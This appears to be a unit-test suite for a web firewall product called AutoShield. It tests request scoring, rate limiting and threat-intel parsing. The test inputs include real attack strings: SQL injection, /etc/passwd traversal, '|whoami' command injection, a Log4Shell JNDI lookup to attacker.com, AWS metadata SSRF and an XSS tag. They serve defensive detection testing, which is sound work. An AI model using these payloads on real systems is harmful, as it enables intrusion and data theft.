"""
AutoShield Enterprise v2.1 — Unit Tests
========================================
Coverage:
  - proxy_engine.EscalationEngine (Aho-Corasick pre-filter + scoring thresholds)
  - redis_rate_limiter.LeakyBucketRateLimiter (in-memory mode)
  - threat_intel_worker._parse_plaintext_ips, _parse_abuseipdb_json
"""

import sys
import os
import time
import json

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ─────────────────────────────────────────────────────────────────────────────
# EscalationEngine Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestEscalationEngine:
    """Tests for proxy_engine.EscalationEngine"""

    def setup_method(self):
        from proxy_engine import EscalationEngine
        self.engine = EscalationEngine()

    def test_clean_request_is_allowed(self):
        result = self.engine.evaluate("10.0.0.1", "GET /products?id=1", "Mozilla/5.0")
        assert result.decision.value == "ALLOW", f"Expected ALLOW but got {result.decision.value}"
        assert result.score < 40, f"Expected score < 40 but got {result.score}"

    def test_sqli_union_select_is_blocked(self):
        result = self.engine.evaluate("10.0.0.2", "GET /p?id=1 UNION SELECT * FROM users--", "curl/7.68")
        assert result.decision.value in ("BLOCK", "CHALLENGE"), (
            f"Expected BLOCK or CHALLENGE but got {result.decision.value} (score={result.score})"
        )
        assert result.attack_type == "SQLi"

    def test_lfi_etc_passwd_is_blocked(self):
        result = self.engine.evaluate("10.0.0.3", "GET /?file=../../../etc/passwd", "python-requests")
        # /etc/passwd is high-confidence LFI — should BLOCK or CHALLENGE
        assert result.decision.value in ("BLOCK", "CHALLENGE"), (
            f"Expected BLOCK or CHALLENGE but got {result.decision.value} (score={result.score})"
        )
        assert result.attack_type == "LFI"

    def test_cmdi_whoami_is_blocked(self):
        result = self.engine.evaluate("10.0.0.4", "POST /upload body=|whoami", "PostmanRuntime/7.0")
        # |whoami is a high-confidence CMDi — engine should BLOCK or CHALLENGE
        # (CHALLENGE = 40-79, BLOCK = 80+; without C-ext, score may land in CHALLENGE range)
        assert result.decision.value in ("BLOCK", "CHALLENGE"), (
            f"Expected threat response but got {result.decision.value} (score={result.score})"
        )
        assert result.attack_type == "CMDi"

    def test_log4shell_is_blocked(self):
        result = self.engine.evaluate(
            "10.0.0.5",
            r"GET / X-Api-Version: ${jndi:ldap://attacker.com/a}",
            "curl/7.0",
        )
        # Log4Shell is CRITICAL — should BLOCK or CHALLENGE
        assert result.decision.value in ("BLOCK", "CHALLENGE"), (
            f"Expected threat response but got {result.decision.value} (score={result.score})"
        )

    def test_ssrf_aws_metadata_is_blocked(self):
        result = self.engine.evaluate(
            "10.0.0.6",
            "GET /?url=http://169.254.169.254/latest/meta-data/",
            "python-requests/2.28",
        )
        # AWS metadata SSRF — should BLOCK or CHALLENGE (score depends on AC extension)
        assert result.decision.value in ("BLOCK", "CHALLENGE"), (
            f"Expected threat response but got {result.decision.value} (score={result.score})"
        )

    def test_googlebot_scores_lower(self):
        """Legitimate bots should score lower (UA modifier -15 applied)"""
        r_googlebot = self.engine.evaluate("10.1.0.1", "GET /robots.txt", "Googlebot/2.1")
        r_curl = self.engine.evaluate("10.1.0.2", "GET /robots.txt", "curl/7.68")
        assert r_googlebot.score <= r_curl.score, (
            f"Googlebot should have lower or equal score. Googlebot: {r_googlebot.score}, curl: {r_curl.score}"
        )

    def test_headless_chrome_scores_higher(self):
        """Headless browsers should score higher (UA modifier +20 applied)"""
        r_headless = self.engine.evaluate("10.2.0.1", "GET /", "HeadlessChrome/110.0")
        r_normal = self.engine.evaluate("10.2.0.2", "GET /", "Mozilla/5.0 Chrome/110.0")
        assert r_headless.score > r_normal.score, (
            f"Headless should score higher. Headless: {r_headless.score}, Normal: {r_normal.score}"
        )

    def test_whitelisted_ip_is_always_allowed(self):
        engine_fresh = __import__("proxy_engine").EscalationEngine()
        engine_fresh.add_to_whitelist("192.168.99.99")
        result = engine_fresh.evaluate(
            "192.168.99.99",
            "GET /?id=1 UNION SELECT * FROM users",
            "curl/1.0",
        )
        assert result.decision.value == "ALLOW", "Whitelisted IP should always ALLOW"

    def test_blocklisted_ip_is_always_blocked(self):
        engine_fresh = __import__("proxy_engine").EscalationEngine()
        engine_fresh._blocklist.add("1.2.3.99")
        result = engine_fresh.evaluate("1.2.3.99", "GET /", "Mozilla/5.0")
        assert result.decision.value == "BLOCK", "Blocklisted IP should always BLOCK"

    def test_latency_under_10ms(self):
        """Verify P99 latency target < 10ms for clean requests"""
        scores = []
        for i in range(50):
            r = self.engine.evaluate(f"172.16.{i}.1", "GET /api/data?page=1", "Mozilla/5.0")
            scores.append(r.latency_ms)
        avg = sum(scores) / len(scores)
        p99 = sorted(scores)[int(len(scores) * 0.99)]
        assert avg < 10.0, f"Average latency {avg:.2f}ms exceeds 10ms target"
        assert p99 < 50.0, f"P99 latency {p99:.2f}ms is unacceptably high"

    def test_repeat_offender_blocks_earlier(self):
        """Repeat offenders hit BLOCK at score 70 instead of 80"""
        from proxy_engine import _IPSession
        engine = __import__("proxy_engine").EscalationEngine()
        # Force session to be a repeat offender
        session = engine._get_or_create_session("5.5.5.5")
        session.is_repeat_offender = True
        # Score of 72 should BLOCK for repeat offender (threshold reduced by 10)
        from proxy_engine import Decision
        decision = engine._threshold_decision(72.0, session)
        assert decision == Decision.BLOCK, f"Repeat offender at 72 should BLOCK, got {decision}"

    def test_xss_script_tag_challenges(self):
        """XSS <script> should be detected and raise score"""
        result = self.engine.evaluate("10.3.0.1", "GET /?q=<script>alert(1)</script>", "Mozilla/5.0")
        assert result.score > 20, f"XSS should raise score above 20, got {result.score}"
        assert result.attack_type == "XSS"

    def test_session_stats_tracking(self):
        """Session stats correctly track requests and hits"""
        engine = __import__("proxy_engine").EscalationEngine()
        for _ in range(5):
            engine.evaluate("6.6.6.6", "GET /", "Mozilla/5.0")
        engine.evaluate("6.6.6.6", "GET /?id=1 UNION SELECT *", "curl")
        stats = engine.get_session_stats("6.6.6.6")
        assert stats is not None
        assert stats["requests"] == 6
        assert stats["attack_hits"] >= 1

    def test_unblock_ip(self):
        """Unblocking an IP removes it from blocklist and resets score"""
        engine = __import__("proxy_engine").EscalationEngine()
        # Block the IP first
        engine._blocklist.add("7.7.7.7")
        engine._sessions["7.7.7.7"] = __import__("proxy_engine")._IPSession(ip="7.7.7.7", score=85.0)
        # Unblock
        engine.unblock_ip("7.7.7.7")
        assert "7.7.7.7" not in engine._blocklist
        stats = engine.get_session_stats("7.7.7.7")
        assert stats["score"] == 0.0


# ─────────────────────────────────────────────────────────────────────────────
# Rate Limiter Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestLeakyBucketRateLimiter:
    """Tests for redis_rate_limiter.LeakyBucketRateLimiter (in-memory mode)"""

    def setup_method(self):
        from redis_rate_limiter import LeakyBucketRateLimiter
        # drip_rate=10, burst=5 → effective limit=15 req per 10s
        self.limiter = LeakyBucketRateLimiter(drip_rate=10, burst=5, window_secs=10)

    def test_under_limit_is_allowed(self):
        for i in range(14):
            result = self.limiter.check(ip=f"11.0.0.{i}", site_id="test")
            assert not result.limited, f"Request {i} should not be limited"

    def test_over_limit_is_blocked(self):
        ip = "12.12.12.12"
        for i in range(14):
            self.limiter.check(ip=ip, site_id="test")
        # 15th should be allowed (drip+burst=15), 16th should be limited
        r16 = self.limiter.check(ip=ip, site_id="test")
        r17 = self.limiter.check(ip=ip, site_id="test")
        assert r16.limited or r17.limited, "Exceeding effective limit should trigger rate limiting"

    def test_uses_memory_backend(self):
        assert self.limiter._redis is None, "Should use in-memory backend in test environment"
        result = self.limiter.check(ip="13.13.13.13", site_id="test")
        assert result.backend == "memory"

    def test_reset_ip_clears_state(self):
        ip = "14.14.14.14"
        for _ in range(20):
            self.limiter.check(ip=ip, site_id="test")
        result_before = self.limiter.check(ip=ip, site_id="test")
        self.limiter.reset_ip(ip=ip, site_id="test")
        result_after = self.limiter.check(ip=ip, site_id="test")
        assert not result_after.limited, "After reset, request should not be limited"

    def test_metrics_reports_violations(self):
        ip = "15.15.15.15"
        for _ in range(20):
            self.limiter.check(ip=ip, site_id="test")
        metrics = self.limiter.get_metrics()
        assert metrics["total_violations"] > 0

    def test_remaining_decrements(self):
        ip = "16.16.16.16"
        prev_remaining = 15
        for _ in range(5):
            result = self.limiter.check(ip=ip, site_id="test")
            assert result.remaining <= prev_remaining
            prev_remaining = result.remaining


# ─────────────────────────────────────────────────────────────────────────────
# Threat Intel Worker Tests
# ─────────────────────────────────────────────────────────────────────────────

class TestThreatIntelParsers:
    """Tests for threat_intel_worker parsing functions"""

    def test_parse_plaintext_ips_filters_comments(self):
        from threat_intel_worker import _parse_plaintext_ips
        data = b"# Comment\n; Also comment\n1.2.3.4\n5.6.7.8\nnot.an.ip\n0.0.0.0\n"
        result = _parse_plaintext_ips(data, "TEST_LABEL", 80)
        assert "1.2.3.4" in result
        assert "5.6.7.8" in result
        assert "not.an.ip" not in result
        assert all(r["threat_score"] == 80 for r in result.values())
        assert all(r["threat_label"] == "TEST_LABEL" for r in result.values())

    def test_parse_abuseipdb_json(self):
        from threat_intel_worker import _parse_abuseipdb_json
        payload = {
            "data": [
                {"ipAddress": "1.1.1.2", "abuseConfidenceScore": 90, "countryCode": "CN"},
                {"ipAddress": "2.2.2.2", "abuseConfidenceScore": 60, "countryCode": "RU"},
                {"ipAddress": "invalid", "abuseConfidenceScore": 100, "countryCode": "US"},
            ]
        }
        result = _parse_abuseipdb_json(json.dumps(payload).encode())
        assert "1.1.1.2" in result
        assert result["1.1.1.2"]["threat_score"] == 90
        assert "2.2.2.2" in result
        assert "invalid" not in result  # Invalid IP should be filtered

    def test_lru_cache_hit_and_eviction(self):
        from threat_intel_worker import _LRUCache
        cache = _LRUCache(max_size=3)
        cache.set("a", {"score": 1})
        cache.set("b", {"score": 2})
        cache.set("c", {"score": 3})
        cache.set("d", {"score": 4})  # Should evict "a" (LRU)
        assert cache.get("a") is None, "LRU entry 'a' should be evicted"
        assert cache.get("d") is not None
        assert cache.hit_rate() > 0

    def test_get_ip_reputation_returns_none_for_unknown(self):
        from threat_intel_worker import get_ip_reputation, _l1_cache, _l2_cache
        # Clear both caches first
        _l1_cache._cache.clear()
        # Unknown IP should return None
        rep = get_ip_reputation("123.234.123.234")
        # Should be None or a dict (could find in DB if seeded); just verify no exception
        assert rep is None or isinstance(rep, dict)


# ─────────────────────────────────────────────────────────────────────────────
# Integration: Escalation + Rate Limiter (no external deps)
# ─────────────────────────────────────────────────────────────────────────────

class TestIntegration:
    """End-to-end flow: rate limit check + escalation decision"""

    def test_full_request_pipeline(self):
        from proxy_engine import EscalationEngine
        from redis_rate_limiter import LeakyBucketRateLimiter

        engine = EscalationEngine()
        limiter = LeakyBucketRateLimiter(drip_rate=100, burst=20, window_secs=60)

        ip = "172.20.0.1"
        # 1. Rate limit check
        rate_result = limiter.check(ip=ip, site_id="site_test")
        assert not rate_result.limited

        # 2. Escalation check — clean request
        esc_result = engine.evaluate(ip, "GET /api/products?page=1", "Mozilla/5.0")
        assert esc_result.decision.value == "ALLOW"
        assert esc_result.latency_ms < 50.0

    def test_attack_pipeline_blocks(self):
        from proxy_engine import EscalationEngine

        engine = EscalationEngine()
        esc_result = engine.evaluate(
            "172.20.0.2",
            "GET /?id=1; DROP TABLE users--",
            "sqlmap/1.7",
        )
        assert esc_result.decision.value in ("BLOCK", "CHALLENGE")
        assert esc_result.score > 20


# ─────────────────────────────────────────────────────────────────────────────
# Test runner (pytest-free CLI mode)
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import traceback

    suites = [
        TestEscalationEngine,
        TestLeakyBucketRateLimiter,
        TestThreatIntelParsers,
        TestIntegration,
    ]

    total = 0
    passed = 0
    failed = 0
    errors_list = []

    print("\n=== AutoShield Enterprise v2.1 — Test Suite ===\n")

    for suite_cls in suites:
        suite = suite_cls()
        print(f"📦 {suite_cls.__name__}")

        for attr in dir(suite_cls):
            if not attr.startswith("test_"):
                continue
            total += 1
            method = getattr(suite, attr)
            # Call setup_method if exists
            if hasattr(suite, "setup_method"):
                suite.setup_method()
            try:
                method()
                print(f"   ✓ {attr}")
                passed += 1
            except Exception as exc:
                failed += 1
                short = str(exc)[:120]
                print(f"   ✗ {attr}: {short}")
                errors_list.append((attr, traceback.format_exc()))

        print()

    print(f"Results: {passed}/{total} passed, {failed} failed")
    if errors_list:
        print("\nFailed Tests Details:")
        for name, tb in errors_list:
            print(f"\n--- {name} ---\n{tb}")
    else:
        print("\n✅ All tests passed!")
